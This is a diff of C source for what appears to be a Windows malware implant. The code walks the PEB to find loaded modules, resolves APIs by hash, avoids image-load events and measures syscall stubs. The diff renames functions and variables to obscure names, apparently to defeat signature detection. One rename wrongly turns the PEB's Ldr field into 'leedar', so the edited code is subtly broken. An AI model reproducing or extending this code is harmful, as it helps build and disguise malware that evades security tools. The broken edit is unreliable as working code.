@@ -14,7 +14,7 @@
  * @param Upper
  * @return
  */
-ULONG HashEx(
+ULONG HaExSH(
     IN PVOID String,
     IN ULONG Length,
     IN BOOL  Upper
@@ -27,7 +27,7 @@ ULONG HashEx(
     }
 
     do {
-        UCHAR character = *Ptr;
+        UCHAR chara = *Ptr;
 
         if ( ! Length ) {
             if ( ! * Ptr ) {
@@ -44,12 +44,12 @@ ULONG HashEx(
         }
 
         if ( Upper ) {
-            if ( character >= 'a' ) {
-                character -= 0x20;
+            if ( chara >= 'a' ) {
+                chara -= 0x20;
             }
         }
 
-        Hash = ( ( Hash << 5 ) + Hash ) + character;
+        Hash = ( ( Hash << 5 ) + Hash ) + chara;
 
         ++Ptr;
     } while ( TRUE );
@@ -65,26 +65,26 @@ ULONG HashEx(
 PVOID LoaderModPebbb(
     IN DWORD Hash
 ) {
-    PLDR_DATA_TABLE_ENTRY Ldr = NULL;
-    PLIST_ENTRY		      Hdr = NULL;
-    PLIST_ENTRY		      Ent = NULL;
-    PPEB			      Peb = NULL;
+    PLDR_DATA_TABLE_ENTRY leedar = NULL;
+    PLIST_ENTRY		      hadaar = NULL;
+    PLIST_ENTRY		      ENTRAA = NULL;
+    PPEB			      pabb = NULL;
 
     /* Get pointer to list */
     if ( ! Instance->Teb ) {
         Instance->Teb = NtCurrentTeb();
     }
 
-    Peb = Instance->Teb->ProcessEnvironmentBlock;
-    Hdr = & Peb->Ldr->InLoadOrderModuleList;
-    Ent = Hdr->Flink;
+    pabb = Instance->Teb->ProcessEnvironmentBlock;
+    hadaar = & pabb->leedar->InLoadOrderModuleList;
+    ENTRAA = hadaar->Flink;
 
-    for ( ; Hdr != Ent ; Ent = Ent->Flink ) {
-        Ldr = C_PTR( Ent );
+    for ( ; hadaar != ENTRAA ; ENTRAA = ENTRAA->Flink ) {
+        leedar = C_PTR( ENTRAA );
 
         /* Compare the DLL Name! */
-        if ( ( HashEx( Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length, TRUE ) == Hash ) || Hash == 0 ) {
-            return Ldr->DllBase;
+        if ( ( HaExSH( leedar->BaseDllName.Buffer, leedar->BaseDllName.Length, TRUE ) == Hash ) || Hash == 0 ) {
+            return leedar->DllBase;
         }
     }
 
@@ -96,22 +96,22 @@ PVOID LoaderModPebbb(
  * @param Module name of module (needs to be upper case: MODULE.DLL)
  * @return
  */
-PVOID LdrModulePebByString(
+PVOID LoaderModPeBStr(
     IN LPWSTR Module
 ) {
     PLDR_DATA_TABLE_ENTRY Ldr  = NULL;
     PLIST_ENTRY		      Hdr  = NULL;
     PLIST_ENTRY		      Ent  = NULL;
     PPEB			      Peb  = NULL;
-    LPWSTR                Name = { 0 };
-    ULONG                 Idx  = 0;
+    LPWSTR                Naamhota = { 0 };
+    ULONG                 Index  = 0;
 
     /* Get pointer to list */
     if ( ! Instance->Teb ) {
         Instance->Teb = NtCurrentTeb();
     }
 
-    Name = MmHeapAlloc( MAX_PATH );
+    Naamhota = MmHeapAlloc( MAX_PATH );
 
     Peb = Instance->Teb->ProcessEnvironmentBlock;
     Hdr = & Peb->Ldr->InLoadOrderModuleList;
@@ -122,35 +122,35 @@ PVOID LdrModulePebByString(
 
         if ( Ldr->BaseDllName.Length <= 260 ) {
 
-            MemCopy( Name, Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length );
+            MemCopy( Naamhota, Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length );
 
             /* turn the module name from PEB to upper */
             do {
-                if ( Idx < Ldr->BaseDllName.Length ) {
-                    if ( Name[ Idx ] >= 'a' ) {
-                        Name[ Idx ] -= 0x20;
+                if ( Index < Ldr->BaseDllName.Length ) {
+                    if ( Naamhota[ Index ] >= 'a' ) {
+                        Naamhota[ Index ] -= 0x20;
                     }
                 } else {
                     break;
                 }
 
-                Idx++;
+                Index++;
             } while ( TRUE );
-            Idx = 0;
+            Index = 0;
 
             /* Compare the DLL Name! */
-            if ( ( StringCompareW( Name, Module ) == 0 ) || Module == NULL ) {
+            if ( ( StringCompareW( Naamhota, Module ) == 0 ) || Module == NULL ) {
                 return Ldr->DllBase;
             }
 
-            MemZero( Name, MAX_PATH );
+            MemZero( Naamhota, MAX_PATH );
         }
     }
 
-    if ( Name ) {
-        MemZero( Name, MAX_PATH );
-        MmHeapFree( Name );
-        Name = NULL;
+    if ( Naamhota ) {
+        MemZero( Naamhota, MAX_PATH );
+        MmHeapFree( Naamhota );
+        Naamhota = NULL;
     }
 
     return NULL;
@@ -162,7 +162,7 @@ PVOID LdrModulePebByString(
  * @param ModuleName module name
  * @return
  */
-PVOID LdrModuleSearch(
+PVOID LoaderModSea(
     IN LPWSTR ModuleName)
 {
     PVOID                 FirstEntry  = NULL;
@@ -236,7 +236,7 @@ PVOID LdrModuleLoad(
     DestSize = StringLengthW( NameW ) * sizeof( WCHAR );
 
     /* check if the module is already loaded */
-    Module = LdrModuleSearch( NameW );
+    Module = LoaderModSea( NameW );
 
     /* if found, avoid generating an image-load event */
     if ( Module ) {
@@ -309,7 +309,7 @@ PVOID LdrModuleLoad(
              * if we failed to load the module then try using LdrLoadDll
              * NOTE: we are getting the module by string because there are some hash collisions
              *       when using LdrModulePeb */
-            if ( ( Module = LdrModulePebByString( NameW ) ) ) {
+            if ( ( Module = LoaderModPeBStr( NameW ) ) ) {
                 break;
             }
 
@@ -402,7 +402,7 @@ PVOID LoaderFuncAdd(
     for ( DWORD i = 0; i < ExpDirectory->NumberOfNames; i++ )
     {
         FunctionName = ( PCHAR ) Module + AddrOfNames[ i ];
-        if ( HashEx( FunctionName, 0, TRUE ) == Hash )
+        if ( HaExSH( FunctionName, 0, TRUE ) == Hash )
         {
             FunctionAddr = C_PTR( Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ] );
 
@@ -437,7 +437,7 @@ PVOID LoaderFuncAdd(
  * and returning the difference of their addresses.
  * This can't be static because it changes between releases.
  */
-UINT32 GetSyscallSize(
+UINT32 GSystemcalsi(
     VOID
 ) {
     PVOID                   Module           = Instance->Modules.Ntdll;
